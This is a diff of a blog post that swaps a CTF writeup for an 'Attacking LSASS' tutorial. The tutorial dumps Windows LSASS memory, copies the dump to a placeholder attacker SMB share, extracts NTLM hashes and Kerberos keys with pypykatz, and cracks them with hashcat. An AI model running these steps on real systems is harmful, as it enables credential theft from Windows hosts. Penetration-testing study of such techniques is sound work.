@@ -1,102 +1,73 @@
 ---
 title: "Attacking LSASS"
-categories: [ctf]
-tags: [ctf, writeup, nahamcon, nahamconctf]
+categories: [projects]
+tags: [passwords, writeup, hacking, security]
 hasComments: true
 date: 2025-11-11
-image: /images/CTF/NAHAMCONCTF2020/logo.png
 ---
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/logo.png"  width="600"/>
-</p>
-  
-Main CTF page: [https://ctf.nahamcon.com/](https://ctf.nahamcon.com/)  
-CTFTime even page: [https://ctftime.org/event/1067](https://ctftime.org/event/1067)  
-Conference page: [https://nahamcon.splashthat.com/](https://nahamcon.splashthat.com/)  
-
-NahamCon 2020 was a conference and a CTF organized by [Naham Sec](https://twitter.com/NahamSec), [John Hammond](https://twitter.com/_johnhammond), [The Cyber Mentor](https://twitter.com/thecybermentor) and [STÖK](https://twitter.com/stokfredrik). The CTF was with no doubts one of the best I participated so far. I'd like to say thanks to all the admins, organizers and authors for this fantastic CTF. It was truly a great experience, the infrastructure was on point and the challenges as well. Top notch quality. The level was also very good, there were challenges for everybody ranging from beginner to advanced. Thank everybody involved in it for these ~30 hours, I enjoyed it and learned quite a few things, which is always the ultimate goal. Looking forward to the next instance :)
-
-This time I participated along with [Kashmir54](https://twitter.com/ManuSanchez54). We finished in 205th-203rd position. We're happy not only with the result, but also with the concepts and techniques we've learned in this CTF. Each CTF feels like we're actually progressing, and that's fantastic. Our knowledge is still at beginners level but we are slowly and steady getting stronger :)
-
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/scoreboard.png"/>
-  <img src="/images/CTF/NAHAMCONCTF2020/scoreboard0.png"/>
-</p>
+# Goal
+Take a memory snapshot (dump) of the LSASS process on a target Windows host, transfer the dump to your attacker machine, and analyze it offline to extract credential material (hashes, tickets, DPAPI keys). This workflow reduces time spent on the target and allows safer, offline analysis.
 
 
-The CTF had several categories. In this page you will find the writeups for some of the challenges we solved:
-  - Warmup:
-    - Read the rules, CLIsay, Metameme, Mr.Robot, UGCC, Easy Keesy and Pang. 
-  - Binary Exploitation:
-    - Dangerous and SaaS.
-  - OSINT:
-    - Time Keeper, Finsta, New Years Resolution and Tron.
-  - Forensics:
-    - Microsooft and Volatile.
+## Connect to the target (example: RDP)
 
-# Warmup
-## Read The Rules
+Example (replace placeholders with lab values)
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/readtherules0.png"/>
-</p>
+xfreerdp /v:<TARGET_IP> /u: /p:
 
-This challenge was very easy, hence the category `warmup`. The flag was hidden in the [rules webpage](https://ctf.nahamcon.com/rules)'s source code. 
+## Create an LSASS memory dump (snapshot)
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/readtherules1.png"/>
-</p>
+GUI method (Task Manager) — when you have an interactive session:
 
-Flag is: flag{we_hope_you_enjoy_the_game}
+Open Task Manager (Ctrl+Shift+Esc).
 
-## CLIsay
+Go to Processes.
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/clisay0.png"/>
-</p>
+Right-click Local Security Authority Process (lsass.exe) Create dump file.
 
-In this challenge we're given a 64-bit ELF. Executing it requests for input. As always, the first thing to do with binaries is looking for hardcoded/static strings in them. 
+The file lsass.DMP is written to %TEMP%, e.g.:
 
-This time turns out the flag was split in 2, but still hardcoded in the binary. 
-
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/clisay1.png"/>
-</p>
-
-Flag is: flag{Y0u_c4n_r3Ad_M1nd5}
-
-Notice how I used `rabin2 -zzz` to get the strings of the binary. It is an alternative to the all-mighty `strings`. 
+C:\Users\<User>\AppData\Local\Temp\lsass.DMP
 
 
-## Metameme
+CLI method — when no GUI is available or using automation:
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/metameme0.png"/>
-</p>
+Identify LSASS PID (tasklist /svc or Get-Process lsass), then use a minidump utility (procdump, or other admin tools). Note: such methods are often flagged by AV/EDR.
 
-This time the downloaded file is a JPG image. 
+Note: Creating LSASS dumps requires administrative privileges. Modern endpoint protections (LSA Protection, Credential Guard, EDR) may block or detect these actions.
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/metameme1.png"/>
-</p>
 
-The image looks pretty normal at a first glance. As always, the next step it to inspect the metadata in case there is something useful. This time there was! The flag was the author's name.
+## Prepare the attacker host to receive the dump (SMB example)
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/metameme2.png"/>
-</p>
+On your attacker Linux machine, create a reception folder and run a simple SMB server (Impacket example):
 
-The flag is: flag{N0t_7h3_4cTuaL_Cr3At0r}
+start SMB server (leave terminal open)
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/<your_user>/Documents/
 
-## Mr. Robot
+What this does: shares /home/<your_user>/Documents as \\<ATTACKER_IP>\CompData. The target can write lsass.DMP to that share.
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/mrrobot0.png"/>
-</p>
+## Transfer the dump from the target to attacker (Windows side)
 
-In this challenge we must inspect a webpage and see where the flag is hidden. 
+Direct UNC copy (no mapping):
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/mrrobot1.png"/>
-</p>
+copy "C:\Users\----\AppData\Local\Temp\lsass.DMP" \\<ATTACKER_IP>\CompData\lsass.DMP
+
+Verify and protect the received dump (attacker host)
+
+## Offline parsing of the dump with pypykatz
+
+pypykatz lsa minidump /home/<your_user>/Documents/lsass.DMP
+
+What pypykatz prints (anonymized):
+
+- LogonSession records (username, domain, SID, LUID)
+- MSV entries (NTLM / NT hash stored in memory)
+- WDIGEST entries (may contain clear-text passwords on older/legacy systems)
+- Kerberos tickets / keys
+- DPAPI masterkeys and GUIDs
+
+## Cracking NT hashes
+
+run hashcat (mode 1000 = NTLM)
+sudo hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt
